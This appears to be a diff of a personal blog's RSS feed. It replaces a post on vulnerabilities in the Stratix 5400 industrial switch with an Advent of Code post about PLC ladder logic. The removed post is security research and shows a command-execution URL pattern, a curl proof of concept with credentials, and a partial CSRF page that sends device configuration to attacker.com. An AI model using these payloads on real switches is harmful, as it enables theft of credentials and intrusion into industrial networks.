@@ -6,7 +6,7 @@
         <description>Recent content in Posts on Stephen&#39;s blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 22 Nov 2025 12:00:00 -0500</lastBuildDate><atom:link href="https://blog.ics.red/posts/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 02 Dec 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ics.red/posts/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Homelab</title>
         <link>https://blog.ics.red/posts/homelab/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -96,339 +96,251 @@
 </description>
         </item>
         <item>
-        <title>Critical Vulnerabilities in Cisco Stratix 5400: GET-Based RCE and Complete Attack Chain</title>
-        <link>https://blog.ics.red/posts/stratix-5400-research/</link>
-        <pubDate>Sat, 22 Nov 2025 12:00:00 -0500</pubDate>
+        <title>Resume</title>
+        <link>https://blog.ics.red/posts/resume/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>https://blog.ics.red/posts/stratix-5400-research/</guid>
-        <description>&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary
-&lt;/h2&gt;&lt;p&gt;While playing around with a Rockwell Stratix 5400 industrial Ethernet switch, I uncovered a series of  &lt;strong&gt;vulnerabilities&lt;/strong&gt; that, when chained together, allow complete device compromise with minimal effort.&lt;/p&gt;
-&lt;h3 id=&#34;key-findings&#34;&gt;Key Findings
-&lt;/h3&gt;&lt;table&gt;
+        <guid>https://blog.ics.red/posts/resume/</guid>
+        <description>&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+</description>
+        </item>
+        <item>
+        <title>Advent of Code 2025: Solving Puzzles with Industrial Ladder Logic</title>
+        <link>https://blog.ics.red/posts/advent-of-code-2025-ladder-logic/</link>
+        <pubDate>Tue, 02 Dec 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://blog.ics.red/posts/advent-of-code-2025-ladder-logic/</guid>
+        <description>&lt;h2 id=&#34;the-challenge-advent-of-code-meets-industrial-automation&#34;&gt;The Challenge: Advent of Code Meets Industrial Automation
+&lt;/h2&gt;&lt;p&gt;What happens when you combine &lt;a class=&#34;link&#34; href=&#34;https://adventofcode.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Advent of Code&lt;/a&gt; with industrial control systems? Ladder logic solutions running on actual PLCs.&lt;/p&gt;
+&lt;p&gt;This year, I solved Advent of Code 2025 puzzles using &lt;strong&gt;ladder logic on an Allen-Bradley Micro870 PLC&lt;/strong&gt;, with a FactoryTalk Optix HMI for visualization.&lt;/p&gt;
+&lt;p&gt;Github Repo with Code: &lt;a class=&#34;link&#34; href=&#34;https://github.com/ladderlogix/Advent-of-Code-2025&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/ladderlogix/Advent-of-Code-2025&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;hardware-setup&#34;&gt;Hardware Setup
+&lt;/h2&gt;&lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
-          &lt;th&gt;Vulnerability&lt;/th&gt;
-          &lt;th&gt;Impact&lt;/th&gt;
-          &lt;th&gt;Exploitability&lt;/th&gt;
+          &lt;th&gt;Component&lt;/th&gt;
+          &lt;th&gt;Model&lt;/th&gt;
       &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
       &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;GET-Based RCE (No CSRF)&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Full command execution&lt;/td&gt;
-          &lt;td&gt;Trivial - single HTTP GET&lt;/td&gt;
+          &lt;td&gt;&lt;strong&gt;PLC&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;Allen-Bradley Micro870 (2080-L70E-24QBBN)&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;CSRF to RCE&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Unauthenticated → RCE via CSRF&lt;/td&gt;
-          &lt;td&gt;Easy - malicious webpage&lt;/td&gt;
+          &lt;td&gt;&lt;strong&gt;HMI&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;FactoryTalk Optix&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;Password Hash Exposure&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Complete credential disclosure&lt;/td&gt;
-          &lt;td&gt;Trivial - view HTML source&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;Privilege Escalation Chain&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;Read-only → Admin escalation&lt;/td&gt;
-          &lt;td&gt;Easy - hash cracking&lt;/td&gt;
+          &lt;td&gt;&lt;strong&gt;Communication&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;Ethernet/IP&lt;/td&gt;
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/posts/stratix-5400-research/switchinsetup.jpg&#34;
-	width=&#34;1200&#34;
-	height=&#34;1600&#34;
-	srcset=&#34;https://blog.ics.red/posts/stratix-5400-research/switchinsetup_hu12109041322939418767.jpg 480w, https://blog.ics.red/posts/stratix-5400-research/switchinsetup_hu7654611312631876348.jpg 1024w&#34;
+&lt;hr&gt;
+&lt;h2 id=&#34;day-1-secret-entrance&#34;&gt;Day 1: Secret Entrance
+&lt;/h2&gt;&lt;h3 id=&#34;the-problem&#34;&gt;The Problem
+&lt;/h3&gt;&lt;p&gt;You arrive at the secret entrance to the North Pole base, but the password has changed. A safe with a dial (numbers 0-99) holds the answer. Your puzzle input contains rotation instructions like &lt;code&gt;L68&lt;/code&gt; (left 68 clicks) or &lt;code&gt;R48&lt;/code&gt; (right 48 clicks).&lt;/p&gt;
+&lt;p&gt;The dial starts at &lt;strong&gt;50&lt;/strong&gt; and wraps around (left from 0 goes to 99, right from 99 goes to 0).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Part 1&lt;/strong&gt;: Count how many times the dial &lt;strong&gt;ends&lt;/strong&gt; on position 0 after a rotation.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Part 2&lt;/strong&gt;: Count how many times the dial &lt;strong&gt;passes through or lands on&lt;/strong&gt; position 0 during ALL rotations (including mid-rotation).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;My Answers&lt;/strong&gt;: Part 1 = &lt;strong&gt;1011&lt;/strong&gt;, Part 2 = &lt;strong&gt;5937&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;video-demonstrations&#34;&gt;Video Demonstrations
+&lt;/h2&gt;&lt;h3 id=&#34;day-1-part-1&#34;&gt;Day 1 Part 1
+&lt;/h3&gt;&lt;div class=&#34;video-wrapper&#34;&gt;
+    &lt;iframe loading=&#34;lazy&#34; 
+            src=&#34;https://www.youtube.com/embed/exmJLdwC1RU&#34; 
+            allowfullscreen 
+            title=&#34;YouTube Video&#34;
+    &gt;
+    &lt;/iframe&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&#34;day-1-part-2&#34;&gt;Day 1 Part 2
+&lt;/h3&gt;&lt;div class=&#34;video-wrapper&#34;&gt;
+    &lt;iframe loading=&#34;lazy&#34; 
+            src=&#34;https://www.youtube.com/embed/s28MHhT4mHE&#34; 
+            allowfullscreen 
+            title=&#34;YouTube Video&#34;
+    &gt;
+    &lt;/iframe&gt;
+&lt;/div&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;part-1-solution&#34;&gt;Part 1 Solution
+&lt;/h2&gt;&lt;p&gt;The algorithm processes 4,146 rotation instructions, tracking position on a circular 0-99 dial.&lt;/p&gt;
+&lt;h3 id=&#34;rung-0---reset&#34;&gt;Rung 0 - Reset
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung1.png&#34;
+	
+	
+	
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;Cisco Stratix 5400 Switch&#34;
+		alt=&#34;Rung 1&#34;
 	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;75&#34;
-		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;Cisco Stratix 5400 Industrial Ethernet Switch - commonly deployed in critical infrastructure&lt;/em&gt;&lt;/p&gt;
-&lt;h2 id=&#34;background-the-cisco-stratix-5400&#34;&gt;Background: The Cisco Stratix 5400
-&lt;/h2&gt;&lt;p&gt;The Cisco Stratix 5400 is an &lt;strong&gt;industrial-grade Ethernet switch&lt;/strong&gt; designed for harsh environments including manufacturing facilities, utilities, oil &amp;amp; gas operations, and transportation systems.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Target Device Specifications:&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Model:&lt;/strong&gt; 1783-BMS10CGP&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;critical-finding-1-get-based-remote-code-execution-no-csrf-protection&#34;&gt;Critical Finding #1: GET-Based Remote Code Execution (No CSRF Protection)
-&lt;/h2&gt;&lt;h3 id=&#34;the-vulnerability&#34;&gt;The Vulnerability
-&lt;/h3&gt;&lt;p&gt;The web interface exposes a &lt;strong&gt;GET-based command execution endpoint&lt;/strong&gt; that accepts arbitrary CLI commands &lt;strong&gt;without CSRF token protection&lt;/strong&gt;:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Endpoint: /%24{variable}%0A?{variable}=&amp;lt;command&amp;gt;
-Method: GET
-Authentication: Required (HTTP Basic Auth)
-CSRF Protection: NONE 
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;technical-details&#34;&gt;Technical Details
-&lt;/h3&gt;&lt;p&gt;The endpoint uses URL-encoded variable substitution:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;%24&lt;/code&gt; = &lt;code&gt;$&lt;/code&gt; (dollar sign)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;%0A&lt;/code&gt; = &lt;code&gt;\n&lt;/code&gt; (newline)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Any variable name works&lt;/strong&gt;: &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt;, &lt;code&gt;c&lt;/code&gt;, &lt;code&gt;d&lt;/code&gt;, &lt;code&gt;cmd&lt;/code&gt;, &lt;code&gt;command&lt;/code&gt;, etc.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;Working pattern discovered:&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /%24b%0A?b=show%20running-config &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.103.143&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Authorization&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Basic YWRtaW46U3RlcGhlbjEz&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Response: 200 OK
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: 4700
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[Full device configuration with passwords]
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Screenshot showing the GET-based RCE endpoint pattern&lt;/em&gt;&lt;/p&gt;
-&lt;h3 id=&#34;proof-of-concept&#34;&gt;Proof of Concept
-&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Simple cURL command:&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -k -u admin:Stephen13 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://192.168.103.143/%24b%0A?b=show%20version%20|%20include%20uptime&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Returns:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stratix uptime is &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; hours, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; minutes
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/posts/stratix-5400-research/examplerce.png&#34;
-	width=&#34;836&#34;
-	height=&#34;425&#34;
-	srcset=&#34;https://blog.ics.red/posts/stratix-5400-research/examplerce_hu6238255412799192376.png 480w, https://blog.ics.red/posts/stratix-5400-research/examplerce_hu13137390444415447660.png 1024w&#34;
+&lt;h3 id=&#34;rung-1---start-processing&#34;&gt;Rung 1 - Start Processing
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung2.png&#34;
+	
+	
+	
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;Successful RCE Execution&#34;
+		alt=&#34;Rung 2&#34;
 	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;196&#34;
-		data-flex-basis=&#34;472px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;Terminal showing successful command execution via the GET-based RCE endpoint&lt;/em&gt;&lt;/p&gt;
-&lt;h3 id=&#34;confirmed-working-commands&#34;&gt;Confirmed Working Commands
-&lt;/h3&gt;&lt;p&gt;All tested commands execute successfully:&lt;/p&gt;
-&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;Command&lt;/th&gt;
-          &lt;th&gt;Output Size&lt;/th&gt;
-          &lt;th&gt;Sensitive Data&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;show running-config&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;4,700 bytes&lt;/td&gt;
-          &lt;td&gt;✅ Passwords, SNMP strings, network config&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;show startup-config&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;3,354 bytes&lt;/td&gt;
-          &lt;td&gt;✅ Saved configuration&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;show version&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;2,921 bytes&lt;/td&gt;
-          &lt;td&gt;✅ IOS version, serial numbers&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;show users&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;142 bytes&lt;/td&gt;
-          &lt;td&gt;✅ Active sessions&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;show ip interface brief&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;820 bytes&lt;/td&gt;
-          &lt;td&gt;✅ Network topology&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;dir flash:&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;1,113 bytes&lt;/td&gt;
-          &lt;td&gt;✅ File system contents&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;&lt;strong&gt;All &amp;ldquo;show&amp;rdquo; commands work. Configuration commands return errors (as expected for GET requests).&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;impact&#34;&gt;Impact
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Complete information disclosure&lt;/strong&gt;: All device configuration, passwords, network topology&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Reconnaissance&lt;/strong&gt;: Full network mapping from a single device&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Credential harvesting&lt;/strong&gt;: SNMP community strings, enable passwords, user accounts&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Compliance violation&lt;/strong&gt;: PCI-DSS, NIST, IEC 62443 requirements&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;critical-finding-2-csrf-leading-to-unauthenticated-rce&#34;&gt;Critical Finding #2: CSRF Leading to Unauthenticated RCE
-&lt;/h2&gt;&lt;h3 id=&#34;the-vulnerability-1&#34;&gt;The Vulnerability
-&lt;/h3&gt;&lt;p&gt;Because the RCE endpoint uses &lt;strong&gt;GET requests with no CSRF token&lt;/strong&gt;, any webpage can trigger command execution when visited by an authenticated administrator.&lt;/p&gt;
-&lt;h3 id=&#34;attack-scenario&#34;&gt;Attack Scenario
-&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;Attacker creates malicious webpage&lt;/li&gt;
-&lt;li&gt;Sends link to network administrator: &amp;ldquo;Check out this network diagnostic tool!&amp;rdquo;&lt;/li&gt;
-&lt;li&gt;Admin clicks link while logged into switch web interface&lt;/li&gt;
-&lt;li&gt;Malicious JavaScript executes commands in admin&amp;rsquo;s browser context&lt;/li&gt;
-&lt;li&gt;Full device configuration exfiltrated to attacker&amp;rsquo;s server&lt;/li&gt;
-&lt;li&gt;Admin sees &amp;ldquo;Diagnostics complete!&amp;rdquo; - never suspects attack&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;proof-of-concept-1&#34;&gt;Proof of Concept
-&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Malicious webpage (csrf_rce_exploit.html):&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;I was unable to fully test this exploit out as I kept running into issues with having two new of a browser and didnt want to sink more time in proving it&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Network Equipment Diagnostics Tool&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;🔧 Network Equipment Diagnostics&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;Running automated diagnostics...&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;status&amp;#34;&lt;/span&gt;&amp;gt;Scanning...&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- Hidden CSRF attacks --&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://192.168.103.143/%24b%0A?b=show%20running-config&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;display:none&amp;#34;&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Exfiltrate stolen data
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stealData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;command&lt;/span&gt;) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://192.168.103.143/%24b%0A?b=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; encodeURIComponent(&lt;span style=&#34;color:#a6e22e&#34;&gt;command&lt;/span&gt;), {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;credentials&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;include&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// Send session cookies
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        })
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;text&lt;/span&gt;())
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; =&amp;gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// Send to attacker&amp;#39;s server
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://attacker.com/collect&amp;#39;&lt;/span&gt;, {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.103.143&amp;#39;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;command&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;command&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                })
